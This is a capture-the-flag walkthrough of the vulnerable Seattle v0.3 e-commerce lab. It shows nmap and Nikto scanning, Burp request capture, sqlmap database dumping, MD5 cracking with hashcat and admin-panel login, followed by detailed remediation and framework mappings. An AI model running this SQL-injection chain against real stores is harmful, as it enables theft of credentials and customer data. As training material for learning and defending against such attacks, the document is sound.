# Seattle: v0.3 — The E-Commerce Store That Forgot About SQL Injection

Look at this one, dude!! Seattle v0.3 is a deliberately vulnerable e-commerce web application and it is a textbook case of what happens when a web app accepts user input without parameterized queries. The attack chain here is pure classic: Nikto scan, cookie capture with Burp Suite, sqlmap enumeration, admin credential extraction, and login. No shell needed. The goal is authenticated access to the admin panel. If you are learning web application security from scratch, this machine teaches the core workflow in a focused, repeatable way. Slept on by many, but legit valuable for understanding SQLi methodology.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Seattle: v0.3 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/seattle-v03,145/ |
| **Techniques** | Network discovery, nmap service scan, Nikto web scanner, Burp Suite proxy, cookie-based SQL injection, sqlmap database enumeration, credential extraction |
| **CVEs** | CWE-89 (SQL Injection: improper neutralization of special elements in SQL queries) |
| **APT Groups** | FIN7: uses SQL injection as a reliable initial access technique against e-commerce and POS systems in retail sector intrusions; Magecart groups: compromise e-commerce platforms via SQLi to inject payment card skimmers and maintain persistent access |

---

## Attack Summary

```
netdiscover / nmap
  |
  +-- port 80 HTTP (Apache + e-commerce app)
        |
        +-- nikto -> vulnerability hints
        |
        +-- manual browse -> find admin username from storefront
        |
        +-- Burp Suite proxy -> capture authentication request + cookies
              |
              +-- sqlmap -r request.txt --dbs -> enumerate databases
                    |
                    +-- sqlmap --tables -> find users/admin table
                          |
                          +-- sqlmap --dump -> extract admin:password hash
                                |
                                +-- login to admin panel
```

---

## Methodology

1. Host discovery and port scan
2. Web application scanning with Nikto
3. Manual browsing to identify admin username and login endpoint
4. Cookie and request capture with Burp Suite
5. SQL injection enumeration with sqlmap
6. Admin credential extraction from database
7. Admin panel login

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.8

nmap -sV -sC 192.168.1.8
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
```

Single HTTP port. Full attack chain is through the web application.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Nikto Web Scan

```bash
nikto -h http://192.168.1.8/
```

Nikto reports:
- Server version disclosure
- Potential SQL injection parameters
- Missing security headers (X-Frame-Options, X-XSS-Protection)
- Interesting paths (/admin, /phpmyadmin if present)

This gives a first map of the attack surface before deeper manual enumeration.

**MITRE ATT&CK:** T1595.003 — Active Scanning: Wordlist Scanning

---

## Step 3 — Manual Browsing and Username Enumeration

Browse the storefront. Seattle v0.3 is a typical PHP e-commerce application:

```bash
# Browse:
http://192.168.1.8/
http://192.168.1.8/admin/
http://192.168.1.8/index.php
```

Look for:
- Product listings that reveal sellers or admin names
- Customer review sections that show usernames
- About pages or contact forms with email addresses
- Login page that reveals whether a username exists (error message difference)

The admin username is typically discoverable through the storefront user interface or login error messages.

**MITRE ATT&CK:** T1592 — Gather Victim Host Information; T1589 — Gather Victim Identity Information

---

## Step 4 — Burp Suite Request Capture

Configure Burp Suite as a proxy (127.0.0.1:8080) and capture a request that includes cookies or POST parameters:

```
1. Open Burp Suite
2. Set browser proxy to 127.0.0.1:8080
3. Browse to the login page
4. Attempt a login (any credentials)
5. Capture the request in Burp Proxy > Intercept
6. Right-click -> Save Item -> save as request.txt
```

The saved request contains all headers, cookies, and POST parameters needed for sqlmap.

**MITRE ATT&CK:** T1557 — Adversary-in-the-Middle (proxy technique for request capture)

---

## Step 5 — SQL Injection with sqlmap

Use the captured request with sqlmap:

```bash
# Enumerate databases
sqlmap -r /tmp/request.txt --dbs --batch

# Example output:
# available databases [2]:
# [*] information_schema
# [*] seattle
```

Enumerate tables in the application database:

```bash
sqlmap -r /tmp/request.txt -D seattle --tables --batch

# Example output:
# Database: seattle
# [4 tables]:
# +-----------+
# | users     |
# | products  |
# | orders    |
# | categories|
# +-----------+
```

Dump the users table:

```bash
sqlmap -r /tmp/request.txt -D seattle -T users --dump --batch

# Example output:
# +----+----------+----------------------------------+-------+
# | id | username | password                         | role  |
# +----+----------+----------------------------------+-------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin |
# +----+----------+----------------------------------+-------+
```

The password hash (MD5 in this case) is easily cracked:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt
# Result: password
```

Or use an online service: crackstation.net.

**Real-world note:** SQL injection remains one of the most common vulnerabilities found in web application penetration tests, consistently appearing in OWASP Top 10 (A03:2021). E-commerce platforms are high-value targets because they hold payment data, PII, and administrative access. Magecart groups specifically target e-commerce sites via SQLi to inject card skimmers that silently exfiltrate payment data.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1555 — Credentials from Password Stores

---

## Step 6 — Admin Panel Login

With the extracted credentials:

```bash
# Login to admin panel
http://192.168.1.8/admin/
# Username: admin
# Password: password (or cracked hash result)
```

Authenticated admin access achieved. The machine goal is complete.

From the admin panel, explore:
- Order management (customer PII and payment data)
- Product management (potential file upload)
- User management (other credentials)
- Configuration settings (database credentials, API keys)

**MITRE ATT&CK:** T1078 — Valid Accounts; T1552.001 — Credentials in Files

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Admin username | admin | Storefront user interface | sqlmap enumeration |
| Password hash | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5) | users table via sqlmap dump | hashcat -m 0 + rockyou |
| Admin password | password | Hash cracked | Admin panel login |
| Admin access | Authenticated admin session | /admin/ | Compromised credentials |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection in e-commerce login/cookie | SQLi remains in OWASP Top 10; e-commerce platforms are high-value SQLi targets for payment data and PII | Use parameterized queries / prepared statements everywhere; never concatenate user input into SQL |
| 2 | Admin username discoverable via storefront | Username enumeration enables targeted brute-force and reduces SQLi dump scope | Avoid exposing admin usernames in storefront; use generic error messages (do not reveal if username exists) |
| 3 | MD5 password hash cracked trivially | MD5 is a cryptographic hash function, not a password storage algorithm; cracks in milliseconds with rockyou | Use bcrypt (cost >= 12) or argon2id for password storage; never MD5/SHA-1 |
| 4 | Admin panel accessible from public network | Admin interfaces should never be reachable from the internet | IP-restrict admin panels to management networks; use MFA for admin access |
| 5 | Burp Suite + sqlmap = complete SQLi exploitation workflow | This workflow is standard in web application penetration tests | Train developers on SQLi; implement WAF rules detecting sqlmap patterns; use parameterized queries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Gather Victim Info | Gather Victim Identity Information | T1589 |
| Initial Access | Initial Access | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | Credential Access | Credentials from Password Stores | T1555 |
| Credential Access | Credential Access | Brute Force: Password Cracking (MD5 hash) | T1110.002 |
| Lateral Movement | Lateral Movement | Valid Accounts | T1078 |

---

## Remediation and Containment

### Technical Fixes

1. **Use parameterized queries** — replace all dynamic SQL string concatenation with prepared statements or ORM; this eliminates SQLi at the root cause
2. **Upgrade password storage** — replace MD5 with bcrypt (cost >= 12) or argon2id; invalidate and force-reset all existing MD5-hashed passwords
3. **Restrict admin panel access** — IP allowlist to management network; require MFA for admin login
4. **Implement WAF rules** — deploy a WAF (ModSecurity, AWS WAF) with rules detecting sqlmap user-agent and common SQLi payloads
5. **Disable verbose error messages** — do not reveal SQL errors or stack traces in production; use generic messages

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web application input points; classify those touching DB |
| Protect | Protective Technology | Parameterized queries; WAF deployment; MFA for admin |
| Protect | Data Security | Replace MD5 with bcrypt/argon2; encrypt sensitive DB columns |
| Detect | Anomalies and Events | Alert on sqlmap patterns in web logs; detect bulk SELECT statements |
| Respond | Response Planning | Rotate all database credentials; invalidate all sessions; patch SQLi |
| Recover | Recovery Planning | Restore DB from clean backup; audit all admin account access |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | IP-restrict admin panel; MFA for admin access |
| IA-5 | Authenticator Management | Replace MD5 with bcrypt/argon2; enforce strong password policy |
| SA-15 | Development Process Security | Mandate parameterized queries in code review; SAST scanning for SQLi |
| SI-10 | Information Input Validation | Validate and sanitize all user input at application layer |
| SC-28 | Protection of Information at Rest | Encrypt sensitive database columns (payment data, PII) |

### CISA KEV

SQL injection is consistently listed in CISA guidance as a top initial-access vector for e-commerce and web application attacks. CISA Alert AA21-131A (Top Routinely Exploited Vulnerabilities) lists SQLi in web applications as a primary attack vector. Organizations running e-commerce platforms are advised to prioritize parameterized query implementation and WAF deployment.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 (DAST scanning; SQLi automated detection in CI/CD) |
| Identity and Access Management (IAM) | Manage Credentials | MIL3 (bcrypt/argon2; MFA for admin) |
| Situational Awareness (SITUATION) | Monitor | MIL2 (WAF alerts on SQLi patterns; web log monitoring) |

### MITRE D3FEND

- **D3-SAOR** — Software Application Hardening: parameterized queries; input validation
- **D3-ACH** — Application Configuration Hardening: WAF rules; verbose error suppression
- **D3-UA** — User Account Management: MFA for admin accounts; IP restriction

---

## Final Thoughts

Seattle v0.3 is purpose-built for learning the SQL injection workflow, and it delivers exactly that. Nikto, Burp Suite, sqlmap, hash crack, admin login: five tools, one clean chain. If you have never done SQLi before, this machine is the right starting point.

The real-world lesson is sobering: this exact chain, scan with Nikto, capture requests, SQLi with sqlmap, dump credentials, still works against a surprising number of production web applications in 2024. The techniques are decades old and the defenses (parameterized queries, bcrypt) have been documented just as long. Yet SQLi remains in OWASP Top 10 because developers keep reinventing broken patterns.

Respect to the Seattle team for building a realistic target.

Thanks guys!! (❍ᴥ❍ʋ)
